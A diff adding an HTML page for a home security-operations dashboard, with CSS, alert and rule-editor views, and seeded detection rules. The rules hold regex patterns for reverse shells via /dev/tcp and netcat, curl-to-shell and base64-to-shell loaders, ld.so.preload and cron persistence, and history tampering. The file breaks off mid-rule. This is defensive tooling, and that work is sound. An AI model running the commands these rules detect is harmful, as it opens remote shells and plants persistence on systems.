@@ -1,0 +1,1774 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>HomeSOC</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@700;800&display=swap" rel="stylesheet" />
+  <style>
+:root {
+  --bg:      #08090c;
+  --bg-1:    #0a0d12;
+  --bg-2:    #0d0f14;
+  --bg-3:    #12151c;
+  --line:    #181b22;
+  --line-2:  #23272f;
+  --ink:     #e8eef2;
+  --ink-dim: #8a96a3;
+  --ink-faint:#6b7785;
+
+  --accent:  #00ff9c;
+  --acc2:    #ff3b5c;
+  --crit:    #ff3b5c;
+  --high:    #ff8c1a;
+  --med:     #ffd23d;
+  --low:     #00d4a0;
+  --ok:      #00ff9c;
+
+  --grid:    rgba(255,255,255,.04);
+  --card:    #0d0f14;
+
+  --mono:    "Space Mono","SF Mono",ui-monospace,Menlo,Consolas,monospace;
+  --display: "Syne","Space Mono",sans-serif;
+  --sans:    "Space Mono","SF Mono",ui-monospace,Menlo,monospace;
+
+  --topbar-h: 52px;
+}
+
+* { box-sizing: border-box; }
+html,body { height: 100%; }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--ink);
+  font-family: var(--mono);
+  font-size: 14.5px;
+  -webkit-font-smoothing: antialiased;
+}
+
+.bg-grid {
+  position: fixed; inset: 0; z-index: -2; pointer-events: none;
+  background-image:
+    linear-gradient(var(--grid) 1px, transparent 1px),
+    linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+  background-size: 48px 48px;
+  -webkit-mask-image: radial-gradient(ellipse at 70% -10%, #000 35%, transparent 85%);
+          mask-image: radial-gradient(ellipse at 70% -10%, #000 35%, transparent 85%);
+}
+.noise {
+  position: fixed; inset: 0; z-index: -1; opacity: .035; pointer-events: none;
+  background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+}
+
+/* ---------- top bar ---------- */
+.topbar {
+  height: var(--topbar-h);
+  display: flex; align-items: center; gap: 24px;
+  padding: 0 16px;
+  border-bottom: 1px solid var(--line);
+  background: linear-gradient(var(--bg-1), var(--bg));
+  position: sticky; top: 0; z-index: 30;
+}
+.topbar::after {
+  content: ""; position: absolute; left: 0; right: 0; bottom: -1px; height: 1px;
+  background: linear-gradient(90deg, transparent, rgba(0,255,156,.45), transparent);
+  opacity: .6;
+}
+.brand { display: flex; align-items: center; gap: 10px; }
+.brand-mark { color: var(--accent); font-size: 18.5px; transform: translateY(-1px); }
+.brand-name { font-family: var(--display); letter-spacing: 1px; font-weight: 800; font-size: 19.5px; }
+.brand-name b { color: var(--accent); font-weight: 800; }
+.brand-sub {
+  font-family: var(--mono); font-size: 11.5px; color: var(--ink-faint);
+  letter-spacing: 1px; text-transform: uppercase; margin-left: 4px;
+}
+.brand-sub.live { color: var(--ok); }
+.brand-sub.down { color: var(--crit); }
+
+.counters { display: flex; gap: 8px; flex: 1; }
+.counter {
+  font-family: var(--mono); font-size: 12.5px;
+  display: inline-flex; align-items: baseline; gap: 6px;
+  padding: 4px 10px; border-radius: 4px;
+  border: 1px solid var(--line-2); background: var(--bg-2);
+}
+.counter .n { font-weight: 700; font-size: 15px; }
+.counter.critical { border-color: rgba(255,59,92,.35); }
+.counter.critical .n { color: var(--crit); }
+.counter.high     { border-color: rgba(255,140,26,.3); }
+.counter.high .n  { color: var(--high); }
+.counter.medium   { border-color: rgba(255,210,61,.28); }
+.counter.medium .n{ color: var(--med); }
+.counter.low      { border-color: rgba(58,214,192,.28); }
+.counter.low .n   { color: var(--low); }
+.counter .lbl { color: var(--ink-faint); text-transform: uppercase; letter-spacing: 1px; font-size: 10.5px; }
+
+.topbar-right { display: flex; align-items: center; gap: 14px; }
+.meta { font-family: var(--mono); font-size: 12.5px; color: var(--ink-dim); }
+
+.btn {
+  font-family: var(--sans); font-size: 14px; font-weight: 500;
+  color: #04121a; background: var(--accent); border: 0;
+  padding: 7px 13px; border-radius: 5px; cursor: pointer;
+}
+.btn:hover { filter: brightness(1.08); }
+.btn.ghost { background: transparent; color: var(--ink-dim); border: 1px solid var(--line-2); }
+.btn.ghost:hover { color: var(--ink); border-color: var(--accent); }
+.btn:focus-visible, select:focus-visible, input:focus-visible, .alert-row:focus-visible {
+  outline: 2px solid var(--accent); outline-offset: 2px;
+}
+
+/* ---------- layout ---------- */
+.layout {
+  display: grid;
+  grid-template-columns: 260px 1fr;
+  height: calc(100vh - var(--topbar-h));
+}
+.panel-head {
+  font-family: var(--mono); font-size: 11.5px; letter-spacing: 2px;
+  text-transform: uppercase; color: var(--ink-faint);
+  padding: 12px 14px 8px;
+}
+
+/* fleet rail */
+.fleet { border-right: 1px solid var(--line); overflow-y: auto; background: var(--bg-1); }
+.fleet-list { padding: 0 8px 16px; }
+.device {
+  display: grid; grid-template-columns: 10px 1fr; gap: 10px;
+  align-items: start; padding: 9px 8px; border-radius: 6px;
+}
+.device + .device { border-top: 1px solid var(--line); }
+.dot { width: 8px; height: 8px; border-radius: 50%; margin-top: 4px; background: var(--ink-faint); }
+.dot.online { background: var(--ok); box-shadow: 0 0 0 0 rgba(53,224,138,.6); animation: pulse 2.4s infinite; }
+@keyframes pulse {
+  0%   { box-shadow: 0 0 0 0 rgba(53,224,138,.5); }
+  70%  { box-shadow: 0 0 0 6px rgba(53,224,138,0); }
+  100% { box-shadow: 0 0 0 0 rgba(53,224,138,0); }
+}
+.device .host { font-family: var(--mono); font-weight: 500; font-size: 14px; }
+.device .sub  { color: var(--ink-faint); font-size: 12px; font-family: var(--mono); margin-top: 2px; }
+.empty { padding: 16px 14px; color: var(--ink-faint); font-family: var(--mono); font-size: 12.5px; }
+
+/* alert queue */
+.queue { display: flex; flex-direction: column; overflow: hidden; }
+.queue-head {
+  display: flex; align-items: center; justify-content: space-between;
+  padding-right: 14px; border-bottom: 1px solid var(--line);
+}
+.filters { display: flex; gap: 8px; }
+select {
+  font-family: var(--mono); font-size: 12.5px; color: var(--ink);
+  background: var(--bg-2); border: 1px solid var(--line-2);
+  border-radius: 5px; padding: 5px 8px;
+}
+.alert-table { overflow-y: auto; flex: 1; }
+
+.alert-row {
+  display: grid;
+  grid-template-columns: 4px 100px 1fr 160px 132px 132px;
+  gap: 12px; align-items: center;
+  padding: 11px 14px 11px 0;
+  border-bottom: 1px solid var(--line);
+  cursor: pointer;
+}
+.alert-row:hover { background: var(--bg-1); }
+.alert-row.active { background: var(--bg-2); }
+.sev-bar { width: 4px; height: 38px; border-radius: 0 2px 2px 0; }
+.sev-critical { background: var(--crit); }
+.sev-high     { background: var(--high); }
+.sev-medium   { background: var(--med); }
+.sev-low      { background: var(--low); }
+
+.col-time { font-family: var(--mono); font-size: 12px; color: var(--ink-dim); }
+.col-title .t { font-weight: 500; }
+.col-title .rid { font-family: var(--mono); font-size: 11.5px; color: var(--ink-faint); margin-top: 2px; }
+.col-host { font-family: var(--mono); font-size: 12.5px; color: var(--ink-dim); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.chips { display: flex; flex-wrap: wrap; gap: 4px; }
+.chip {
+  font-family: var(--mono); font-size: 11px; letter-spacing: .5px;
+  padding: 2px 6px; border-radius: 3px;
+  border: 1px solid var(--line-2); color: var(--ink-dim); background: var(--bg-2);
+}
+.status-tag {
+  display: inline-flex; align-items: center; justify-self: start;
+  font-family: var(--mono); font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
+  padding: 4px 9px; border-radius: 4px; line-height: 1; white-space: nowrap;
+}
+.st-new           { color: var(--accent); border: 1px solid rgba(0,255,156,.4); }
+.st-investigating { color: var(--med);    border: 1px solid rgba(255,210,61,.4); }
+.st-resolved      { color: var(--ink-faint); border: 1px solid var(--line-2); }
+
+/* ---------- drawer (alert story) ---------- */
+.drawer-scrim {
+  position: fixed; inset: 0; background: rgba(2,5,9,.55);
+  opacity: 0; pointer-events: none; transition: opacity .2s; z-index: 40;
+}
+.drawer-scrim.open { opacity: 1; pointer-events: auto; }
+.drawer {
+  position: fixed; top: 0; right: 0; height: 100vh; width: min(680px, 94vw);
+  background: var(--bg-1); border-left: 1px solid var(--line-2);
+  transform: translateX(102%); transition: transform .24s ease; z-index: 41;
+  overflow-y: auto; box-shadow: -24px 0 60px rgba(0,0,0,.5);
+}
+.drawer.open { transform: translateX(0); }
+
+.story-head { padding: 18px 20px 14px; border-bottom: 1px solid var(--line); position: sticky; top: 0; background: var(--bg-1); z-index: 2; }
+.story-head .row1 { display: flex; align-items: center; gap: 10px; }
+.sev-badge {
+  font-family: var(--mono); font-size: 11.5px; font-weight: 700; letter-spacing: 1px;
+  text-transform: uppercase; padding: 3px 9px; border-radius: 4px; color: #060a0e;
+}
+.sev-badge.sev-critical { background: var(--crit); }
+.sev-badge.sev-high     { background: var(--high); }
+.sev-badge.sev-medium   { background: var(--med); }
+.sev-badge.sev-low      { background: var(--low); }
+.story-title { font-size: 19.5px; font-weight: 600; margin: 10px 0 6px; }
+.story-meta { font-family: var(--mono); font-size: 12.5px; color: var(--ink-dim); display: flex; flex-wrap: wrap; gap: 14px; }
+.drawer-close { position: absolute; top: 16px; right: 16px; }
+
+.story-actions { display: flex; gap: 8px; padding: 12px 20px; border-bottom: 1px solid var(--line); flex-wrap: wrap; }
+.seg { display: inline-flex; border: 1px solid var(--line-2); border-radius: 5px; overflow: hidden; }
+.seg button {
+  font-family: var(--mono); font-size: 12px; background: var(--bg-2);
+  color: var(--ink-dim); border: 0; padding: 6px 11px; cursor: pointer;
+}
+.seg button.on { background: var(--accent); color: #04121a; font-weight: 700; }
+.seg button + button { border-left: 1px solid var(--line-2); }
+
+.section { padding: 16px 20px; border-bottom: 1px solid var(--line); }
+.section h3 {
+  font-family: var(--mono); font-size: 11.5px; letter-spacing: 2px; text-transform: uppercase;
+  color: var(--ink-faint); margin: 0 0 10px;
+}
+.kv { display: grid; grid-template-columns: 140px 1fr; gap: 6px 14px; font-size: 14px; }
+.kv .k { color: var(--ink-faint); font-family: var(--mono); font-size: 12.5px; }
+.kv .v { font-family: var(--mono); word-break: break-word; }
+.story-note { color: var(--ink-faint); font-size: 12.5px; font-style: italic; margin-top: 10px; }
+
+.code {
+  font-family: var(--mono); font-size: 13px; line-height: 1.5;
+  background: var(--bg); border: 1px solid var(--line); border-radius: 6px;
+  padding: 12px; overflow-x: auto; white-space: pre-wrap; word-break: break-word;
+  color: #b9ccdd;
+}
+
+/* match conditions */
+.cond { font-family: var(--mono); font-size: 12.5px; margin: 4px 0; color: var(--ink-dim); }
+.cond .f { color: var(--accent); }
+.cond .op { color: var(--med); }
+
+/* process tree spine */
+.tree { position: relative; padding-left: 4px; }
+.tnode { display: flex; align-items: flex-start; gap: 10px; padding: 6px 0; position: relative; }
+.tnode .spine {
+  width: 14px; flex: 0 0 14px; align-self: stretch; position: relative;
+}
+.tnode .spine::before {
+  content: ""; position: absolute; left: 6px; top: 0; bottom: 0; width: 1px; background: var(--line-2);
+}
+.tnode .knob {
+  position: absolute; left: 2px; top: 9px; width: 9px; height: 9px; border-radius: 50%;
+  background: var(--bg-1); border: 1.5px solid var(--line-2);
+}
+.tnode.trigger .knob { background: var(--crit); border-color: var(--crit); box-shadow: 0 0 8px var(--crit); }
+.tnode .body { flex: 1; min-width: 0; }
+.tnode .pname { font-family: var(--mono); font-weight: 600; font-size: 14px; }
+.tnode.trigger .pname { color: var(--crit); }
+.tnode .pids { color: var(--ink-faint); font-size: 11.5px; font-family: var(--mono); margin-left: 8px; }
+.tnode .cmd { font-family: var(--mono); font-size: 12.5px; color: var(--ink-dim); margin-top: 2px; word-break: break-all; }
+
+/* timeline */
+.tl-item { display: grid; grid-template-columns: 88px 78px 1fr; gap: 12px; padding: 7px 0; border-top: 1px solid var(--line); font-size: 13px; }
+.tl-item:first-child { border-top: 0; }
+.tl-item.trigger { background: rgba(255,59,92,.07); margin: 0 -8px; padding: 7px 8px; border-radius: 4px; }
+.tl-time { font-family: var(--mono); color: var(--ink-faint); font-size: 12px; }
+.tl-cat { font-family: var(--mono); font-size: 11.5px; text-transform: uppercase; letter-spacing: .5px; }
+.tl-cat.process { color: var(--accent); }
+.tl-cat.file    { color: var(--med); }
+.tl-cat.network { color: var(--low); }
+.tl-cat.auth    { color: var(--high); }
+.tl-sum { font-family: var(--mono); color: var(--ink-dim); word-break: break-all; }
+
+/* behavioral */
+.behav { white-space: pre-wrap; font-family: var(--mono); font-size: 13px; line-height: 1.55; color: #c2d3e3; }
+.behav-empty { color: var(--ink-faint); font-size: 14px; }
+
+/* ---------- settings modal ---------- */
+.modal-scrim {
+  position: fixed; inset: 0; background: rgba(2,5,9,.6); display: none;
+  align-items: center; justify-content: center; z-index: 60;
+  padding: 24px; overflow-y: auto;
+}
+.modal-scrim.open { display: flex; }
+.modal { width: min(520px, 94vw); background: var(--bg-1); border: 1px solid var(--line-2); border-radius: 10px; }
+.modal-head { display: flex; align-items: center; justify-content: space-between; padding: 16px 18px; border-bottom: 1px solid var(--line); }
+.modal-head h2 { font-size: 17px; margin: 0; font-family: var(--mono); letter-spacing: 1px; }
+.modal-body { padding: 18px; }
+.hint { color: var(--ink-dim); font-size: 14px; line-height: 1.5; margin: 0 0 16px; }
+.field { display: block; margin-bottom: 14px; }
+.field > span { display: block; font-family: var(--mono); font-size: 12.5px; color: var(--ink-faint); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px; }
+.field > span em { color: var(--ok); font-style: normal; text-transform: none; letter-spacing: 0; }
+.field input[type=text], .field input[type=password] {
+  width: 100%; font-family: var(--mono); font-size: 14px; color: var(--ink);
+  background: var(--bg); border: 1px solid var(--line-2); border-radius: 6px; padding: 9px 11px;
+}
+.toggle { display: flex; align-items: center; gap: 8px; font-family: var(--sans); color: var(--ink); font-size: 14px; text-transform: none; letter-spacing: 0; }
+.modal-actions { display: flex; align-items: center; gap: 12px; margin-top: 4px; }
+.save-state { font-family: var(--mono); font-size: 12.5px; color: var(--ok); }
+
+@media (max-width: 820px) {
+  .layout { grid-template-columns: 1fr; }
+  .fleet { display: none; }
+  .alert-row { grid-template-columns: 4px 1fr 90px; }
+  .alert-row .col-time, .alert-row .chips { display: none; }
+}
+@media (prefers-reduced-motion: reduce) {
+  * { animation: none !important; transition: none !important; }
+}
+
+/* ---------- tabs ---------- */
+.tabs { display: inline-flex; gap: 2px; margin-left: 6px; }
+.tab {
+  font-family: var(--mono); font-size: 12.5px; letter-spacing: 1px; text-transform: uppercase;
+  color: var(--ink-faint); background: transparent; border: 0; cursor: pointer;
+  padding: 6px 12px; border-radius: 5px; position: relative;
+}
+.tab:hover { color: var(--ink); }
+.tab.on { color: var(--accent); background: var(--bg-2); }
+
+/* ---------- rules view ---------- */
+.rules-layout { height: calc(100vh - var(--topbar-h)); overflow-y: auto; padding: 16px 20px 40px; }
+.rules-head { display: flex; align-items: center; justify-content: space-between; }
+.rules-controls { display: flex; gap: 8px; align-items: center; }
+.btn.sm { font-size: 12.5px; padding: 5px 9px; }
+.btn.danger { color: var(--crit); border-color: rgba(255,59,92,.4); }
+.btn.danger:hover { border-color: var(--crit); color: #fff; background: rgba(255,59,92,.12); }
+.rules-note { color: var(--ink-faint); font-size: 13px; margin: 2px 0 14px; max-width: 760px; line-height: 1.5; }
+
+.rules-table { border-top: 1px solid var(--line); }
+.rule-row {
+  display: grid;
+  grid-template-columns: 4px 210px 1fr 92px 120px 120px 96px 220px;
+  gap: 12px; align-items: center; padding: 9px 8px 9px 0;
+  border-bottom: 1px solid var(--line); cursor: pointer;
+}
+.rule-last { display: flex; align-items: center; gap: 10px; justify-content: flex-end; }
+.rule-row:hover { background: var(--bg-1); }
+.rule-row .rid { font-family: var(--mono); font-size: 12.5px; color: var(--ink); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.rule-row .rtitle { font-size: 14.5px; }
+.rule-row .rcat { font-family: var(--mono); font-size: 12px; color: var(--ink-dim); text-transform: uppercase; letter-spacing: .5px; }
+.rule-row .rplat { font-family: var(--mono); font-size: 11.5px; color: var(--ink-faint); }
+.src-tag { font-family: var(--mono); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; padding: 2px 7px; border-radius: 3px; text-align: center; justify-self: start; }
+.src-builtin { color: var(--ink-faint); border: 1px solid var(--line-2); }
+.src-custom  { color: var(--accent); border: 1px solid rgba(0,255,156,.4); background: rgba(0,255,156,.06); }
+.rule-actions { display: flex; gap: 6px; justify-content: flex-end; }
+.rstate { display: flex; align-items: center; gap: 8px; }
+.rstate .lbl { font-family: var(--mono); font-size: 11px; color: var(--ink-faint); text-transform: uppercase; letter-spacing: 1px; }
+
+/* toggle switch */
+.switch { position: relative; width: 34px; height: 18px; flex: 0 0 34px; }
+.switch input { opacity: 0; width: 0; height: 0; }
+.switch .track { position: absolute; inset: 0; background: var(--line-2); border-radius: 10px; transition: background .15s; }
+.switch .track::before { content: ""; position: absolute; left: 2px; top: 2px; width: 14px; height: 14px; border-radius: 50%; background: var(--ink-dim); transition: transform .15s; }
+.switch input:checked + .track { background: rgba(53,224,138,.3); }
+.switch input:checked + .track::before { transform: translateX(16px); background: var(--ok); }
+
+/* ---------- rule editor modal ---------- */
+.modal-lg { width: min(900px, 96vw); max-height: calc(100vh - 48px); display: flex; flex-direction: column; }
+.modal-lg .modal-head { flex: 0 0 auto; }
+.modal-lg .modal-body { overflow-y: auto; }
+.re-grid { display: grid; grid-template-columns: 1fr 360px; gap: 18px; }
+.re-form .field { margin-bottom: 12px; }
+.re-row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.re-checks { display: flex; gap: 14px; font-family: var(--sans); font-size: 14px; color: var(--ink); text-transform: none; letter-spacing: 0; }
+.re-checks label { display: inline-flex; align-items: center; gap: 5px; }
+textarea {
+  width: 100%; font-family: var(--mono); font-size: 14px; color: var(--ink);
+  background: var(--bg); border: 1px solid var(--line-2); border-radius: 6px; padding: 8px 10px; resize: vertical;
+}
+.re-cond { display: grid; grid-template-columns: 1.1fr 1fr 1.3fr 26px; gap: 6px; margin-bottom: 6px; }
+.re-cond input, .re-cond select { font-family: var(--mono); font-size: 12.5px; background: var(--bg); color: var(--ink); border: 1px solid var(--line-2); border-radius: 5px; padding: 6px 7px; min-width: 0; }
+.re-cond .cond-del { background: transparent; border: 1px solid var(--line-2); color: var(--ink-faint); border-radius: 5px; cursor: pointer; font-size: 15px; line-height: 1; }
+.re-cond .cond-del:hover { color: var(--crit); border-color: var(--crit); }
+
+.re-side { border-left: 1px solid var(--line); padding-left: 18px; }
+.re-side-head { font-family: var(--mono); font-size: 11.5px; letter-spacing: 2px; text-transform: uppercase; color: var(--ink-faint); margin: 0 0 8px; }
+.re-side-head + .re-side-head { margin-top: 16px; }
+.re-yaml { max-height: 220px; overflow: auto; margin: 0; font-size: 12.5px; }
+.re-sample { font-size: 12.5px; }
+.re-test-actions { display: flex; align-items: center; gap: 8px; margin-top: 8px; }
+.re-test-out { font-family: var(--mono); font-size: 12.5px; }
+.re-test-out.ok { color: var(--ok); }
+.re-test-out.no { color: var(--high); }
+.re-test-out.err { color: var(--crit); }
+
+.re-footer { display: flex; align-items: center; gap: 12px; margin-top: 16px; padding-top: 14px; border-top: 1px solid var(--line); }
+.re-spacer { flex: 1; }
+.re-status { font-family: var(--mono); font-size: 12.5px; }
+.re-status.ok { color: var(--ok); }
+.re-status.err { color: var(--crit); }
+
+.re-form.locked { opacity: .7; }
+.re-form.locked input, .re-form.locked select, .re-form.locked textarea, .re-form.locked button { pointer-events: none; }
+
+@media (max-width: 900px) {
+  .re-grid { grid-template-columns: 1fr; }
+  .re-side { border-left: 0; padding-left: 0; border-top: 1px solid var(--line); padding-top: 14px; }
+  .rule-row { grid-template-columns: 4px 1fr 150px; }
+  .rule-row .rtitle, .rule-row .rcat, .rule-row .rplat, .rule-row .chips, .rule-row .src-tag { display: none; }
+}
+
+/* ---------- display headings ---------- */
+.modal-head h2 { font-family: var(--display); font-weight: 800; letter-spacing: .3px; }
+.panel-head, .queue-head .panel-head { font-family: var(--display); font-weight: 700; letter-spacing: .5px; }
+
+</style>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <div class="noise"></div>
+  <header class="topbar">
+    <div class="brand">
+      <span class="brand-mark">▟</span>
+      <span class="brand-name">HOME<b>SOC</b></span>
+      <span class="brand-sub" id="conn-state">connecting…</span>
+    </div>
+    <nav class="tabs">
+      <button class="tab on" data-view="alerts" id="tab-alerts">Alerts</button>
+      <button class="tab" data-view="rules" id="tab-rules">Rules</button>
+    </nav>
+    <div class="counters" id="counters"></div>
+    <div class="topbar-right">
+      <span class="meta" id="meta-devices">0 devices</span>
+      <span class="meta" id="meta-rules">0 rules</span>
+      <span class="meta" id="demo-badge" style="color:var(--med)">● seeded demo</span>
+      <button class="btn ghost" id="btn-settings">Settings</button>
+    </div>
+  </header>
+
+  <main class="layout" id="view-alerts">
+    <aside class="fleet">
+      <div class="panel-head">Fleet</div>
+      <div class="fleet-list" id="fleet-list"></div>
+    </aside>
+
+    <section class="queue">
+      <div class="queue-head">
+        <div class="panel-head">Alerts</div>
+        <div class="filters">
+          <select id="f-status">
+            <option value="">all states</option>
+            <option value="new">new</option>
+            <option value="investigating">investigating</option>
+          </select>
+          <select id="f-severity">
+            <option value="">all severities</option>
+            <option value="critical">critical</option>
+            <option value="high">high</option>
+            <option value="medium">medium</option>
+            <option value="low">low</option>
+          </select>
+        </div>
+      </div>
+      <div class="alert-table" id="alert-table"></div>
+    </section>
+  </main>
+
+  <main class="rules-layout" id="view-rules" hidden>
+    <div class="rules-head">
+      <div class="panel-head" style="padding-left:0">Detection rules</div>
+      <div class="rules-controls">
+        <select id="rf-source">
+          <option value="">all sources</option>
+          <option value="builtin">built-in</option>
+          <option value="custom">custom</option>
+        </select>
+        <select id="rf-severity">
+          <option value="">all severities</option>
+          <option value="critical">critical</option>
+          <option value="high">high</option>
+          <option value="medium">medium</option>
+          <option value="low">low</option>
+        </select>
+        <button class="btn" id="btn-new-rule">New rule</button>
+      </div>
+    </div>
+    <div class="rules-note">Built-in rules are read-only. Custom rules you create here are stored on the
+      server and merged into live detection immediately — no restart, no file editing.</div>
+    <div class="rules-table" id="rules-table"></div>
+  </main>
+
+  <!-- Alert story drawer -->
+  <div class="drawer-scrim" id="drawer-scrim"></div>
+  <aside class="drawer" id="drawer" aria-hidden="true"></aside>
+
+  <!-- Settings modal -->
+  <div class="modal-scrim" id="settings-scrim">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="settings-title">
+      <div class="modal-head">
+        <h2 id="settings-title">Settings</h2>
+        <button class="btn ghost" id="settings-close">Close</button>
+      </div>
+      <div class="modal-body">
+        <p class="hint">Signature detection runs without any of this. The Claude
+          token only enables optional behavioral analysis on an alert you choose.
+          It is stored on the server and never shown back in full.</p>
+        <label class="field">
+          <span>Behavioral analysis</span>
+          <span class="toggle">
+            <input type="checkbox" id="set-enabled" />
+            <span>Enable Claude analysis</span>
+          </span>
+        </label>
+        <label class="field">
+          <span>Claude API token <em id="token-state"></em></span>
+          <input type="password" id="set-token" placeholder="sk-ant-…  (leave blank to keep current)" autocomplete="off" />
+        </label>
+        <label class="field">
+          <span>Model</span>
+          <input type="text" id="set-model" placeholder="claude-sonnet-4-6" />
+        </label>
+        <div class="modal-actions">
+          <button class="btn" id="set-save">Save settings</button>
+          <span class="save-state" id="save-state"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Rule editor modal -->
+  <div class="modal-scrim" id="rule-scrim">
+    <div class="modal modal-lg" role="dialog" aria-modal="true" aria-labelledby="rule-title">
+      <div class="modal-head">
+        <h2 id="rule-title">New rule</h2>
+        <button class="btn ghost" id="rule-close">Close</button>
+      </div>
+      <div class="modal-body">
+        <div class="re-grid">
+          <div class="re-form">
+            <label class="field"><span>Rule ID</span>
+              <input id="re-id" type="text" placeholder="auto from title (a custom- prefix is added)" autocomplete="off" /></label>
+            <label class="field"><span>Title</span>
+              <input id="re-title" type="text" placeholder="Short, specific name" autocomplete="off" /></label>
+            <div class="re-row2">
+              <label class="field"><span>Severity</span>
+                <select id="re-severity">
+                  <option value="low">low</option>
+                  <option value="medium">medium</option>
+                  <option value="high" selected>high</option>
+                  <option value="critical">critical</option>
+                </select></label>
+              <label class="field"><span>Applies to</span>
+                <select id="re-category">
+                  <option value="">any category</option>
+                  <option value="process">process</option>
+                  <option value="file">file</option>
+                  <option value="network">network</option>
+                  <option value="auth">auth</option>
+                </select></label>
+            </div>
+            <label class="field"><span>Platforms <em>(none = all)</em></span>
+              <span class="re-checks">
+                <label><input type="checkbox" value="linux" class="re-plat" /> linux</label>
+                <label><input type="checkbox" value="windows" class="re-plat" /> windows</label>
+                <label><input type="checkbox" value="darwin" class="re-plat" /> macOS</label>
+              </span></label>
+            <label class="field"><span>Description</span>
+              <textarea id="re-desc" rows="2"></textarea></label>
+            <div class="re-row2">
+              <label class="field"><span>MITRE techniques</span>
+                <input id="re-mitre" type="text" placeholder="T1059.001, T1027" autocomplete="off" /></label>
+              <label class="field"><span>References</span>
+                <textarea id="re-refs" rows="2" placeholder="one URL per line"></textarea></label>
+            </div>
+            <div class="field">
+              <span>Match conditions <em>(all must match)</em></span>
+              <div id="re-conditions"></div>
+              <button class="btn ghost sm" id="re-add-cond">+ Add condition</button>
+            </div>
+          </div>
+          <div class="re-side">
+            <div class="re-side-head">YAML preview</div>
+            <pre class="code re-yaml" id="re-yaml"></pre>
+            <div class="re-side-head">Test against a sample event</div>
+            <textarea id="re-sample" class="re-sample" rows="7" spellcheck="false"
+              placeholder='{"category":"process","process":{"cmdline":"..."}}'></textarea>
+            <div class="re-test-actions">
+              <button class="btn ghost sm" id="re-example">Load example</button>
+              <button class="btn ghost sm" id="re-test">Test match</button>
+              <span class="re-test-out" id="re-test-out"></span>
+            </div>
+          </div>
+        </div>
+        <div class="re-footer">
+          <button class="btn ghost" id="re-validate">Validate</button>
+          <span class="re-status" id="re-status"></span>
+          <span class="re-spacer"></span>
+          <button class="btn ghost danger" id="re-delete" hidden>Delete</button>
+          <button class="btn ghost" id="re-cancel">Cancel</button>
+          <button class="btn" id="re-save">Save rule</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <datalist id="re-fields">
+    <option value="process.name"></option>
+    <option value="process.exe"></option>
+    <option value="process.cmdline"></option>
+    <option value="process.username"></option>
+    <option value="process.parent_name"></option>
+    <option value="process.pid"></option>
+    <option value="process.ppid"></option>
+    <option value="file.path"></option>
+    <option value="file.name"></option>
+    <option value="action"></option>
+    <option value="network.process_name"></option>
+    <option value="network.raddr"></option>
+    <option value="network.rport"></option>
+    <option value="network.proto"></option>
+    <option value="network.status"></option>
+    <option value="auth.user"></option>
+    <option value="auth.result"></option>
+    <option value="auth.method"></option>
+    <option value="auth.source_ip"></option>
+    <option value="auth.logon_type"></option>
+  </datalist>
+
+  <script>
+window.__SEED_RULES = [{"id": "lin-reverse-shell-devtcp", "title": "Bash /dev/tcp reverse shell", "severity": "critical", "category": "process", "platform": ["linux"], "mitre": ["T1059.004", "T1071.001"], "description": "Interactive bash redirected to a /dev/tcp socket \u2014 classic reverse shell.", "references": ["https://attack.mitre.org/techniques/T1059/004/"], "match": [{"field": "process.cmdline", "op": "regex", "values": ["/dev/(tcp|udp)/", "bash\\s+-i"]}]}, {"id": "lin-netcat-exec", "title": "Netcat with command execution flag", "severity": "high", "category": "process", "platform": ["linux"], "mitre": ["T1059.004"], "description": "nc/ncat invoked with -e/-c to bind or reverse a shell.", "references": [], "match": [{"field": "process.name", "op": "in", "values": ["nc", "ncat", "netcat"]}, {"field": "process.cmdline", "op": "regex", "values": ["\\s-(e|c)\\b"]}]}, {"id": "lin-curl-pipe-shell", "title": "Remote script piped to a shell", "severity": "high", "category": "process", "platform": ["linux"], "mitre": ["T1059.004", "T1105"], "description": "curl/wget output piped directly into bash/sh \u2014 drive-by install pattern.", "references": [], "match": [{"field": "process.cmdline", "op": "regex", "values": ["(curl|wget)\\b[^|]*\\|\\s*(sudo\\s+)?(ba)?sh\\b"]}]}, {"id": "lin-base64-decode-pipe-shell", "title": "Base64-decoded payload piped to shell", "severity": "high", "category": "process", "platform": ["linux"], "mitre": ["T1140", "T1059.004"], "description": "base64 -d output piped into an interpreter \u2014 common obfuscated loader.", "references": [], "match": [{"field": "process.cmdline", "op": "regex", "values": ["base64\\s+(-d|--decode)[^|]*\\|\\s*(ba)?sh\\b"]}]}, {"id": "lin-ld-preload-write", "title": "Write to /etc/ld.so.preload", "severity": "critical", "category": "file", "platform": ["linux"], "mitre": ["T1574.006"], "description": "Modification of ld.so.preload \u2014 userland rootkit / library injection persistence.", "references": [], "match": [{"field": "file.path", "op": "equals", "value": "/etc/ld.so.preload"}, {"field": "action", "op": "in", "values": ["create", "modify", "move"]}]}, {"id": "lin-cron-persistence", "title": "New file in a cron directory", "severity": "medium", "category": "file", "platform": ["linux"], "mitre": ["T1053.003"], "description": "File created/modified under /etc/cron.* or cron spool \u2014 scheduled-task persistence.", "references": [], "match": [{"field": "file.path", "op": "regex", "values": ["^/etc/cron", "^/var/spool/cron"]}, {"field": "action", "op": "in", "values": ["create", "modify", "move"]}]}, {"id": "lin-history-tamper", "title": "Shell history disabled or cleared", "severity": "medium", "category": "process", "platform": ["linux"], "mitre": ["T1070.003"], "description": "HISTFILE unset or history file emptied 